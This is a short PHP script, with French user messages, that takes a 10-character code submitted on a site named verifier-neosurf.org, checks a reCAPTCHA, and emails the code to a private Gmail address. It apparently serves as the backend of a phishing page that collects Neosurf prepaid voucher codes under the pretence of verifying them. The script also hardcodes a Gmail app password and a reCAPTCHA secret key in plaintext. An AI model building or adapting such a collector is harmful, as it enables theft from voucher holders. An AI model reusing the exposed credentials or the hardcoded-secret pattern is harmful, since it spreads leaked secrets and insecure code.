<?php

header('Content-Type: application/json; charset=UTF-8');

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require __DIR__ . '/PHPMailer/src/Exception.php';
require __DIR__ . '/PHPMailer/src/PHPMailer.php';
require __DIR__ . '/PHPMailer/src/SMTP.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode([
        'success' => false,
        'message' => 'Méthode non autorisée.'
    ]);
    exit;
}

$data = json_decode(file_get_contents('php://input'), true);

$orderNumber = trim($data['orderNumber'] ?? '');

if (!preg_match('/^[A-Za-z0-9]{10}$/', $orderNumber)) {
    echo json_encode([
        'success' => false,
        'message' => 'Numéro de commande invalide.'
    ]);
    exit;
}
$captcha = $data['captcha'] ?? '';

if (empty($captcha)) {
    echo json_encode([
        'success' => false,
        'message' => 'Veuillez compléter le reCAPTCHA.'
    ]);
    exit;
}
$recaptchaSecret = '6Ld1LYUtAAAAAAOWzd8h2WvPEWDBVIWm1bmcUedR';

$verifyUrl = 'https://www.google.com/recaptcha/api/siteverify';

$postData = http_build_query([
    'secret'   => $recaptchaSecret,
    'response' => $captcha
]);

$options = [
    'http' => [
        'method'  => 'POST',
        'header'  => 'Content-Type: application/x-www-form-urlencoded',
        'content' => $postData,
        'timeout' => 10
    ]
];

$context = stream_context_create($options);

$verifyResponse = file_get_contents($verifyUrl, false, $context);

if ($verifyResponse === false) {
    echo json_encode([
        'success' => false,
        'message' => 'Impossible de vérifier le reCAPTCHA.'
    ]);
    exit;
}

$captchaResult = json_decode($verifyResponse, true);

if (empty($captchaResult['success'])) {
    echo json_encode([
        'success' => false,
        'message' => 'La vérification reCAPTCHA a échoué.'
    ]);
    exit;
}


/*
|--------------------------------------------------------------------------
| CONFIGURATION SMTP
|--------------------------------------------------------------------------
*/

$smtpUser = 'canardfourchue@gmail.com';
$smtpPassword = 'xnhs wfju bfei kgbk';

$destinationEmail = 'canardfourchue@gmail.com';


$mail = new PHPMailer(true);

try {

    $mail->isSMTP();

    $mail->Host       = 'smtp.gmail.com';
    $mail->SMTPAuth   = true;
    $mail->Username   = $smtpUser;
    $mail->Password   = $smtpPassword;

    // Gmail SMTP avec TLS
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port       = 587;

    $mail->CharSet = 'UTF-8';

    /*
     * L'adresse From doit correspondre au compte SMTP utilisé.
     */
    $mail->setFrom($smtpUser, 'Site web');

    $mail->addAddress($destinationEmail);

    $mail->Subject = 'Nouvelle commande';

    $mail->isHTML(false);

    $mail->Body =
        "Nouvelle demande reçue\n\n" .
        "Numéro de commande : " . $orderNumber . "\n\n" .
        "Site : verifier-neosurf.org";

    $mail->send();

    echo json_encode([
        'success' => true,
        'message' => 'Votre demande a été envoyée.'
    ]);

} catch (Exception $e) {

    error_log('PHPMailer error: ' . $mail->ErrorInfo);

    http_response_code(500);

    echo json_encode([
        'success' => false,
        'message' => 'Impossible d’envoyer la demande.'
    ]);
}